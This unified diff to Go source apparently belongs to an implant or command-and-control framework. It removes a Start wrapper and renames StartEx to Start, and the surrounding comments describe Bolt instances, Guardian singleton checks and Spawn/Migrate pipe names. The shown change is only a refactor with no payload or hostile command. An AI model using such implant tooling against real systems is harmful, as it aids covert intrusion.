@@ -33,25 +33,6 @@ import (
 // Start attempts to create a Bolt instance with the supplied arguments.
 // This function will block and will NOT return (it calls 'device.GoExit').
 //
-// This function makes some default assumptions and has the following options
-// set: 'ignore=false', 'load=true', 'critical=true'. These can be changed by
-// using the 'StartEx' function instead.
-//
-// Arguments:
-//   l        - Guardian Linker type to use. If nil, will default to 'Pipe'.
-//   guard    - String name for the Guardian to look for/create. DO NOT FORMAT
-//               THIS NAME, it will be formatted based on the Linker type.
-//   pipe     - Pipe name used for Bolt's started via Spawn/Migrate. Use this as
-//               a non-formatted name to be passed to any Spawn/Migrate commands.
-//   c        - Packed Config. The resulting profile will be build when the function
-//               starts and will silently return if it fails.
-func Start(l man.Linker, guard, pipe string, c cfg.Config) {
-	StartEx(false, true, true, l, guard, pipe, c)
-}
-
-// StartEx attempts to create a Bolt instance with the supplied arguments.
-// This function will block and will NOT return (it calls 'device.GoExit').
-//
 // Arguments:
 //   ignore   - If True, this will ignore any currently existing Guardians with
 //               the same guard name.
@@ -68,7 +49,7 @@ func Start(l man.Linker, guard, pipe string, c cfg.Config) {
 //               a non-formatted name to be passed to any Spawn/Migrate commands.
 //   c        - Packed Config. The resulting profile will be build when the function
 //               starts and will silently return if it fails.
-func StartEx(ignore, load, critical bool, l man.Linker, guard, pipe string, c cfg.Config) {
+func Start(ignore, load, critical bool, l man.Linker, guard, pipe string, c cfg.Config) {
 	p, err := c.Build()
 	if err != nil {
 		return
